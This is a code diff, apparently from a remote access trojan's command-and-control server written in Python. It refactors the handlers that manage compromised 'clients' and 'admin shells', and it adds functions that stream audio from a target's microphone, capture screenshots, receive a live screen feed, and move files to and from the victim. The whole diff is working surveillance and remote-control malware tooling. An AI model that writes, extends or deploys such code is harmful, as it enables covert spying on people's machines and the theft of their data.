@@ -92,14 +92,14 @@ def handle_client(client_socket, client_address, client_id):
         'connected': True
     }
     
-    # Auto-select admin shells when they connect
-    global selected_client
-    if client_id > 1:  # Admin shell
-        selected_client = client_id
-        print(f"{GREEN}[+] Auto-selected Admin Client {client_id} for interaction{RESET}")
-    else:
-        # Show updated client list for user shells only
-        list_clients()
+    # # Auto-select admin shells when they connect
+    # global selected_client
+    # if client_id > 1:  # Admin shell
+    #     selected_client = client_id
+    #     print(f"{GREEN}[+] Auto-selected Admin Client {client_id} for interaction{RESET}")
+    # else:
+    #     # Show updated client list for user shells only
+    #     list_clients()
     
     try:
         while clients[client_id]['connected']:
@@ -161,12 +161,77 @@ def download_file(file_name, target_socket):
         print(f"{RED}[-] Download error: {str(e)}{RESET}")
 
 
+# Suppress ALSA errors
+ERROR_HANDLER_FUNC = CFUNCTYPE(None, c_char_p, c_int, c_char_p, c_int, c_char_p)
+def py_error_handler(filename, line, function, err, fmt): pass
+c_error_handler = ERROR_HANDLER_FUNC(py_error_handler)
+try:
+    asound = ctypes.cdll.LoadLibrary('libasound.so')
+    asound.snd_lib_error_set_handler(c_error_handler)
+except OSError:
+    pass
+
+stream_flag = {'on': False}
+
+def start_audio_receiver(target_socket):
+    global stream_flag, audio_thread
+    if not stream_flag['on']:
+        stream_flag = {'on': True}
+        audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag, target_socket), daemon=True).start()
+        result = reliable_recv()
+        print(result)
+    else:
+        print(f"{YELLOW}[!] Audio stream already running. Use 'listening_stop' to stop it.{RESET}")
+
+def stop_audio_receiver(target_socket):
+    global stream_flag, audio_thread
+    if stream_flag['on']:
+        stream_flag['on'] = False
+        if audio_thread:
+            audio_thread.join()  # Wait for the audio thread to finish
+            audio_thread = None  # Reset the thread reference
+        result = reliable_recv(target_socket)
+        print(result)
+    else:
+        pass
+
+def stream_audio_from_target(flag, target_socket):
+    CHUNK, FORMAT, CHANNELS, RATE = 1024, pyaudio.paInt16, 1, 11025
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
+    try:
+        while flag['on']:
+            data = target_socket.recv(CHUNK)
+            if not data: break
+            stream.write(data)
+    finally:
+        stream.stop_stream(); stream.close(); p.terminate()
+
+
+# Screen surveillance functions
+def recieve_shot(target_socket):
+    shot = reliable_recv(target_socket)
+    if shot:
+        try:
+            img = base64.b64decode(shot)
+            fname = f"screenshot_c{selected_client}_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
+            with open(fname, 'wb') as f:
+                f.write(img)
+            print(f"{GREEN}[+] Screenshot saved as {fname}{RESET}")
+        except Exception as e:
+            print(f"{RED}[-] Screenshot processing error: {str(e)}{RESET}")
+    else:
+        print(f"{RED}[-] No screenshot received{RESET}")
+
+def start_screen_stream():
+    threading.Thread(target=receive_screen_stream, daemon=True).start()
+    print(f"{YELLOW}[*] Awaiting live stream...{RESET}")
+
 def receive_screen_stream():
     stream_sock = socket.socket()
     stream_sock.bind(('0.0.0.0', 9999))
     stream_sock.listen(1)
     conn, addr = stream_sock.accept()
-    print(f"{GREEN}[+] Live screen stream from {addr[0]}:{addr[1]}{RESET}")
     try:
         while True:
             size_data = conn.recv(4)
@@ -186,29 +251,6 @@ def receive_screen_stream():
     finally:
         conn.close()
         cv2.destroyAllWindows()
-
-# Suppress ALSA errors
-ERROR_HANDLER_FUNC = CFUNCTYPE(None, c_char_p, c_int, c_char_p, c_int, c_char_p)
-def py_error_handler(filename, line, function, err, fmt): pass
-c_error_handler = ERROR_HANDLER_FUNC(py_error_handler)
-try:
-    asound = ctypes.cdll.LoadLibrary('libasound.so')
-    asound.snd_lib_error_set_handler(c_error_handler)
-except OSError:
-    pass
-
-
-def stream_audio_from_target(flag, target_socket):
-    CHUNK, FORMAT, CHANNELS, RATE = 1024, pyaudio.paInt16, 1, 11025
-    p = pyaudio.PyAudio()
-    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
-    try:
-        while flag['on']:
-            data = target_socket.recv(CHUNK)
-            if not data: break
-            stream.write(data)
-    finally:
-        stream.stop_stream(); stream.close(); p.terminate()
 
 
 def target_communication():
@@ -248,12 +290,14 @@ Within Client Session:
         except EOFError:
             print(f"\n{YELLOW}[!] exiting...{RESET}")
             os._exit(0)
+        if cmd == 'quit' or cmd == 'exit':
+            print(f"{YELLOW}[!] Exiting server...{RESET}")
+            os._exit(0)
         if cmd == 'help':
             print(HELP_TEXT)
             continue
         if cmd == 'clients':
             list_clients()
-            selected_client = None
             continue
         if cmd == 'select':
             selected_client = None
@@ -271,28 +315,15 @@ Within Client Session:
         elif cmd.startswith('upload '):
             upload_file(cmd.split(' ',1)[1], sock)
         elif cmd == 'listening_start':
-            flag = {'on': True}
-            threading.Thread(target=stream_audio_from_target, args=(flag, sock), daemon=True).start()
-            print(f"{GREEN}[+] Audio stream started{RESET}")
+            start_audio_receiver(sock)
         elif cmd == 'listening_stop':
-            flag['on'] = False
-            print(f"{GREEN}[+] Audio stream stopped{RESET}")
+            stop_audio_receiver(sock)
         elif cmd == 'screenshot':
-            shot = reliable_recv(sock)
-            if shot:
-                try:
-                    img = base64.b64decode(shot)
-                    fname = f"screenshot_c{selected_client}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
-                    with open(fname, 'wb') as f:
-                        f.write(img)
-                    print(f"{GREEN}[+] Screenshot saved as {fname}{RESET}")
-                except Exception as e:
-                    print(f"{RED}[-] Screenshot processing error: {str(e)}{RESET}")
-            else:
-                print(f"{RED}[-] No screenshot received{RESET}")
+            recieve_shot(sock)
         elif cmd == 'screen_stream':
-            threading.Thread(target=receive_screen_stream, daemon=True).start()
-            print(f"{YELLOW}[*] Awaiting live stream...{RESET}")
+            start_screen_stream()
+            result = reliable_recv(sock)
+            print(result)            
         else:
             res = reliable_recv(sock)
             if res:
